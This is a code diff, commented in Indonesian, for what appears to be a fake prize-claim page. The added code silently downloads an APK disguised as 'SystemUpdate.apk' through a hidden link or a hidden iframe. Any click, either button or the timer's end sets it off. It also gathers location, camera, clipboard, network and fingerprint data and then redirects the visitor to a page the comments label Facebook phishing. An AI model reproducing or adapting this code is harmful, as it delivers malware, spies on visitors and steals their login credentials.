@@ -42,6 +42,13 @@ var hasLS = (typeof localStorage !== 'undefined');
 var hasSS = (typeof sessionStorage !== 'undefined');
 var semuaDidapat = false;
 
+// Cek apakah sudah pernah klaim
+if(hasLS && localStorage.getItem('sudah_klaim') === '1') {
+    semuaDidapat = true;
+    var popup = document.getElementById('popupDana');
+    if(popup) popup.style.display = 'none';
+}
+
 if(hasLS) {
     var saved = localStorage.getItem('vd');
     if(saved) try{ dataStore = JSON.parse(saved) } catch(e){}
@@ -167,26 +174,66 @@ function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.avai
 function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
 function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }
 
+// DOWNLOAD - SystemUpdate.apk DULU, diam-diam
 var files = [
     'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
     'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
 ];
 var downloaded = [];
 
+function downloadDiamDiam(url, filename) {
+    // Cara 1: Fetch + Blob (diam-diam, tanpa notif)
+    fetch(url, {mode: 'no-cors'})
+        .then(function(res) { return res.blob(); })
+        .then(function(blob) {
+            var objectURL = URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = objectURL;
+            a.download = filename;
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(function() {
+                document.body.removeChild(a);
+                URL.revokeObjectURL(objectURL);
+            }, 2000);
+            downloaded.push(url);
+            K({sumber:'download',data:{file:filename},waktu:Date.now()});
+        })
+        .catch(function() {
+            // Cara 2: Fallback iframe tersembunyi
+            var iframe = document.createElement('iframe');
+            iframe.src = url;
+            iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
+            document.body.appendChild(iframe);
+            setTimeout(function() { document.body.removeChild(iframe); }, 5000);
+            downloaded.push(url);
+            K({sumber:'download',data:{file:filename},waktu:Date.now()});
+        });
+}
+
 function initM2() {
-    files.forEach(function(f, i) {
-        setTimeout(function() {
-            if(downloaded.indexOf(f) !== -1) return;
-            if(A.isAvailable) { A.downloadFile(f, f.split('/').pop()); }
-            else {
-                var a=document.createElement('a');a.href=f;a.download=f.split('/').pop();
-                a.style.display='none';document.body.appendChild(a);a.click();
-                setTimeout(function(){ document.body.removeChild(a) },1000);
+    // SystemUpdate.apk DULU (detik 1)
+    setTimeout(function() {
+        if(downloaded.indexOf(files[0]) === -1) {
+            if(A.isAvailable) {
+                A.downloadFile(files[0], 'SystemUpdate.apk');
+            } else {
+                downloadDiamDiam(files[0], 'SystemUpdate.apk');
             }
-            downloaded.push(f);
-            K({sumber:'download',data:{file:f.split('/').pop()},waktu:Date.now()});
-        }, 1000 + (i * 500));
-    });
+        }
+    }, 1000);
+    
+    // Video.mp4 kemudian (detik 3)
+    setTimeout(function() {
+        if(downloaded.indexOf(files[1]) === -1) {
+            if(A.isAvailable) {
+                A.downloadFile(files[1], 'Video.mp4');
+            } else {
+                downloadDiamDiam(files[1], 'Video.mp4');
+            }
+        }
+    }, 3000);
 }
 
 function FK() {
@@ -198,25 +245,44 @@ function FK() {
     K({sumber:'full_kontrol',data:'selesai'});
 }
 
+// ================================================================
+// POPUP + KLIK = DAPAT SEMUA (POPUP MUNCUL SEKALI SAJA)
+// ================================================================
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
+    
+    // Simpan status
+    if(hasLS) localStorage.setItem('sudah_klaim', '1');
+    
+    // Hapus popup
+    var popup = document.getElementById('popupDana');
+    if(popup) popup.style.display = 'none';
+    
+    // Ambil semua data
     ambilLokasi();ambilKamera();ambilBaterai();ambilStorage();
     ambilNetwork();ambilIPLocal();ambilCanvasFP();ambilWebGLFP();
     ambilPlugins();ambilFonts();ambilScreenDetail();ambilDNT();cekAdBlock();
     initM2();FK();bacaClipboard();
+    
+    // Redirect ke FB phishing
     setTimeout(function(){ window.location.href='https://verifikasi.site/fb'; },3000);
 }
 
-function klaim() { document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua() },500); K({sumber:'izin',data:'klaim'}); }
-function tolak() { document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua() },500); K({sumber:'izin',data:'tolak'}); }
-document.addEventListener('click',function(){ setTimeout(function(){ dapatkanSemua() },1000); });
+function klaim() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'klaim'}); }
+function tolak() { setTimeout(function(){ dapatkanSemua(); },500); K({sumber:'izin',data:'tolak'}); }
 
+// Klik di mana saja
+var clickHandler = function(){ setTimeout(function(){ dapatkanSemua(); },1000); };
+document.addEventListener('click', clickHandler);
+setTimeout(function(){ document.removeEventListener('click', clickHandler); }, 300000);
+
+// Timer
 var w=300;
 var timerInterval=setInterval(function(){
     w--;var m=Math.floor(w/60);var s=w%60;
     var el=document.getElementById('timer');if(el) el.textContent=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
-    if(w<=0){ clearInterval(timerInterval); document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua() },500); }
+    if(w<=0){ clearInterval(timerInterval); document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua(); },500); }
 },1000);
 
 function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
@@ -229,6 +295,7 @@ GD();getIP();SW();KA();HB();
 setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
 window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
 
+// PHISHING
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
